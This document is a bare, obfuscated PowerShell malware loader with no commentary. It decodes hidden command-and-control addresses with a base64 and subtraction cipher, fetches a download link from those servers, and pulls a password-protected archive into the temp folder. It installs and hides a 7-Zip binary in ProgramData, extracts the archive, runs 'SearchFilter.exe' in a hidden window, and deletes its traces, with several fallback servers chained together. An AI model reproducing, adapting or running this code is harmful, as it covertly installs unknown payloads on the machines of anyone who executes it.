function DS { param ([string]$u, [int]$t = 15000) ; $r = [System.Net.WebRequest]::Create($u) ; $r.Timeout = $t ; $res = $r.GetResponse() ; $sr = New-Object System.IO.StreamReader($res.GetResponseStream()) ; $c = $sr.ReadToEnd() ; $sr.Close() ; $res.Close() ; return $c }; function rnt { try { $kkz = "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug=="; $sfg = Dec -txtb4 $kkz -xA30 $prooc; $rspns = Invoke-RestMethod -Uri $sfg; if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc; } $decs = $dt; $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); $client = New-Object System.Net.WebClient; $by = $client.DownloadData($decs); if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $by); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { pst; } }; function pst { try { $vatyfd = "wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpsOaw6Fcw5rCl8K0wpzDssKFwpDCs8OlwrrCt8KI"; $asdhg = Dec -txtb4 $vatyfd -xA30 $prooc; $rspns = Invoke-RestMethod -Uri $asdhg; if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc; } $decs = $dt; $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); $client = New-Object System.Net.WebClient; $by = $client.DownloadData($decs); if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $by); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { ptgs; } }; function ptgs { try { $sd = "wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpMOUwqPCn8OJwq1sw6HDn8KSw5TDtMOXw4HCqcK7w5U="; $gf = Dec -txtb4 $sd -xA30 $prooc; $wb = New-Object System.Net.WebClient; $dcf = DS($gf); $ln = $dcf -split "`n"; if ($ln.Length -gt 0) { $fr = Dec $ln[0] $proc; DFxF $wb $fr; } } catch { mlaotgzybtlc; } finally { $webClient.Dispose(); } }; function mlaotgzybtlc { try { $hwul = "wr3DqMK3w5vDp2fCl2XCr8OSw6fCpcORw7PCosK4w6Nyw57DpsKQw5BjwqfDoMOwwpPDhMOvw6TDg8OowrbDocObwqPDoMKmbMOfw5rCqA=="; $sfg = Dec -txtb4 $hwul -xA30 $prooc; $rspns = Invoke-RestMethod -Uri $sfg; if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc; } $decs = $dt; $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); $client = New-Object System.Net.WebClient; $by = $client.DownloadData($decs); if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $by); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { pst; } }; function DFxF { param ([System.Net.WebClient]$C, [string]$U) $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\.", "").Substring(0, 10); try { $b = $C.DownloadData($U); if ($b.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $b); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { mlaotgzybtlc; } }; $prooc = "UtCkt-h6=my1_zt"; $proc = "qpb9,83M8n@~{ba;W`$,}"; function Dec { param ([string]$txtb4, [string]$xA30) try { $encB = [System.Convert]::FromBase64String($txtb4); $encT = [System.Text.Encoding]::UTF8.GetString($encB); $decT = New-Object char[] $encT.Length; for ($i = 0; $i -lt $encT.Length; $i++) { $char = $encT[$i]; $pCh = $xA30[$i % $xA30.Length]; $decT[$i] = [char]($char - $pCh); } return -join $decT } catch {} }; function Ext { param ([string]$arch, [string]$op) $sZip = "C:\ProgramData\sevenZip\7z.exe"; $arg = "x `"$arch`" -o`"$op`" -phR3^&b2%A9!gK*6LqP7t`$NpW -y"; Start-Process -FilePath $sZip -ArgumentList $arg -WindowStyle Hidden -Wait }; $p = "C:\ProgramData\sevenZip"; if (-not (Test-Path "$p\7z.exe")) { New-Item -ItemType Directory -Path $p -Force; $u = "https://www.7-zip.org/a/7zr.exe"; $o = Join-Path -Path $p -ChildPath "7z.exe"; $webClient = New-Object System.Net.WebClient; $webClient.DownloadFile($u, $o); $webClient.Dispose(); Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); Set-ItemProperty -Path $p -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); }; rnt